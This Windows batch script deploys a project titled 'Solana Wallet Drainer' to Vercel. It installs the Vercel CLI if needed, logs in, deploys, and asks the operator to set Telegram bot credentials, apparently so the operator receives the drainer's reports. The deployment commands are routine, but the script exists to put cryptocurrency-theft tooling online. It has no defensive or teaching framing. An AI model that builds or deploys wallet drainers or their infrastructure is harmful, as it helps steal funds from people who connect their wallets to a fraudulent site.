@echo off
echo ========================================
echo   Solana Wallet Drainer - Vercel Deploy
echo ========================================
echo.

echo Checking Vercel CLI...
npx vercel --version
if %errorlevel% neq 0 (
    echo Installing Vercel CLI...
    npm install -g vercel
)

echo.
echo Starting deployment...
echo.

echo Step 1: Login to Vercel (if not already logged in)
npx vercel login

echo.
echo Step 2: Deploy to Vercel
npx vercel

echo.
echo ========================================
echo   Deployment Complete!
echo ========================================
echo.
echo Your app will be available at:
echo https://your-project-name.vercel.app
echo.
echo Don't forget to set environment variables in Vercel dashboard:
echo - TELEGRAM_BOT_TOKEN
echo - TELEGRAM_CHAT_ID
echo - NODE_ENV=production
echo.
pause
